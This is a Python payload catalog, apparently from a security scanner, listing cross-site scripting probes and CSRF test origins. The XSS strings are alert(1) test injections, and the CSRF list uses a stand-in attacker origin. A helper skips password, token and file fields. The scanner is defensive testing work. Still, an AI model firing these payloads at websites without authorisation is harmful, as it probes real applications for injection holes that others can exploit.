"""Payload catalog for ARGUS 1-1 XSS/CSRF checks."""

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<scrIpt>alert(1);</scrIpt>",
    "<img src=x onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<!--<img src=--><img src=x onerror=alert(1)//>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]

CONTEXT_PAYLOADS = {
    "html_body": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
    "html_attribute": ["\" onmouseover=alert(1) x=\"", "' autofocus onfocus=alert(1) x='"],
    "json_string": ["\\\"+alert(1)+\\\"", "</script><script>alert(1)</script>"],
    "url_or_js": ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
}

HEADER_XSS_PAYLOAD = "<script>alert('header')</script>"

CSRF_TEST_ORIGINS = [
    "https://evil-attacker.local",
    "http://evil-attacker.local",
    "null",
]

CSRF_CONTENT_TYPES = [
    "text/plain",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
]


def normalized_field_name(param_name: str = "") -> str:
    return str(param_name or "").replace("_", "").replace("-", "").lower()


def is_sensitive_or_nontext_field(param_name: str = "") -> bool:
    name = normalized_field_name(param_name)
    blocked_tokens = [
        "password",
        "passwd",
        "secret",
        "token",
        "refresh",
        "access",
        "image",
        "file",
        "upload",
        "avatar",
        "photo",
        "price",
        "amount",
        "count",
        "quantity",
        "date",
        "time",
    ]
    return any(token in name for token in blocked_tokens)


def payloads_for_xss_field(param_name: str = "", schema: dict | None = None, components: dict | None = None) -> list[str]:
    if is_sensitive_or_nontext_field(param_name):
        return []
    return XSS_PAYLOADS
